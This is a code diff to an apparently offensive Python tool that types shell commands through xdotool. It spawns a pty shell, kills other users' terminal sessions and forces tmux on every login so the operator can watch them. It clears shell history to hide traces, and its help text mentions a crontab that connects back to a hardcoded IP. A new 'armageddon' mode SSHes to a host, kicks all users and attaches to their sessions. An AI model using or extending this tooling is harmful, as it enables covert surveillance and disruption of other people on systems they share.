@@ -12,6 +12,8 @@ parser.add_argument("--kick", help="Kick other pts sessions, use -1 to kick all 
 parser.add_argument("--ts", action='store_true', help="tmux setup, make every login start a tmux session by default", )
 parser.add_argument("--ats", action='store_true', help="Attach to latest tmux session, watch other people :D", )
 parser.add_argument("--ic", help="Install crontab, to automatically connect to your ip, IP hardcoded in script, port needs to be specified", type=str , default=-1)
+parser.add_argument("--armageddon", help="[user@host] Connect, install tmux, kick all, listen for tmux session and connect", type=str , default=-1)
+parser.add_argument("--wft", action='store_true', help="Waiting for temux session to connect", )
 
 # Parse command-line arguments
 args = parser.parse_args()
@@ -24,13 +26,8 @@ def press(key):
     # use subprocess and xdotool to press key
     subprocess.run(["xdotool", "key", key])
 # Check if command is "bs"
-sleep(2)
-kick_value = args.kick
-if args.bs:
-    write("python3 -c 'import pty; pty.spawn(\"/bin/bash\")' && history -c")
 
-if args.kick != -2:
-    if args.kick == -1: 
+def kickAll():
         write("w | awk '{print($2)}' | grep pts > active_sessions")
         press("Return")
         write("ps -efH | grep $$ | grep bash | grep -v grep | awk '{print($6)}' > my_session")
@@ -45,14 +42,11 @@ if args.kick != -2:
         press("Return")
         write("history -c")
         press("Return")
-    elif args.kick > -1:
-        write(f'ps -efH | grep pts/{kick_value}' + ' | awk \'{system("kill " $2)}\' && history -c')
 
-if args.ts:
-   #!/bin/bash
+def tmuxSetup(): 
     write("sudo apt install tmux -y")
     press("Return")
-    sleep(10)
+    sleep(3)
     write("echo 'isTmux=0' >> .profile")
     press("Return")
     write("echo 'iKnow=0' >> .profile")
@@ -80,6 +74,23 @@ if args.ts:
     write("echo 'fi' >> .profile && history -c")
     press("Return")
 
+def waitForTmux():
+    write("counter=$(w | wc -l); until [ $counter -gt 3 ] && [ $(w | grep tmux | wc -l) -gt 0 ] ; do sleep 1; ((counter = $(w | wc -l))); clear; w; done && tmux attach-session -t $(tmux list-sessions | grep attached | grep -v '0 windows' | awk '{print $1}' | cut -d ':' -f 1 | tail -n 1)")
+    press("Return")
+sleep(2)
+kick_value = args.kick
+if args.bs:
+    write("python3 -c 'import pty; pty.spawn(\"/bin/bash\")' && history -c")
+
+if args.kick != -2:
+    if args.kick == -1: 
+        kickAll()
+    elif args.kick > -1:
+        write(f'ps -efH | grep pts/{kick_value}' + ' | awk \'{system("kill " $2)}\' && history -c')
+
+if args.ts:
+   #!/bin/bash
+    tmuxSetup()
 if args.ats:
     write("tmux attach-session -t $(tmux list-sessions | grep attached | grep -v '0 windows' | awk '{print $1}' | cut -d ':' -f 1 | tail -n 1)")
     press("Return")
@@ -93,6 +104,21 @@ if args.ic != -1:
     press("Return")
     write("history -c")
     press("Return")
+
+if args.wft:
+    waitForTmux()
+
+if args.armageddon != -1:
+    ip = args.armageddon
+    write(f"ssh {ip}")
+    press("Return")
+    sleep(8)
+    tmuxSetup()
+    sleep(1)
+    kickAll()
+    sleep(1)
+    waitForTmux()
+
 
 if len(sys.argv)==1:
     parser.print_help()
